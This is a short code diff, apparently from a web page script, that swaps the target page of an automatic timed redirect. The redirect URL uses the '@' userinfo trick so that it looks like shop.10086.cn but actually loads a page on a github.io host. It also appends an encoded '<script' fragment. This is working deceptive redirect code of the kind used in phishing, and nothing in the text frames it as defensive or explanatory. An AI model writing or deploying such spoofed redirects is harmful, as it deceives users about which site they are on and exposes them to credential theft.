@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://shop.10086.cn@iuuc.github.io./lqq.html' + '?' + timestamp + '%3Cscript';
+    var url = 'https://shop.10086.cn@iuuc.github.io./p33.html' + '?' + timestamp + '%3Cscript';
     location.href = url;
 }, 1000);
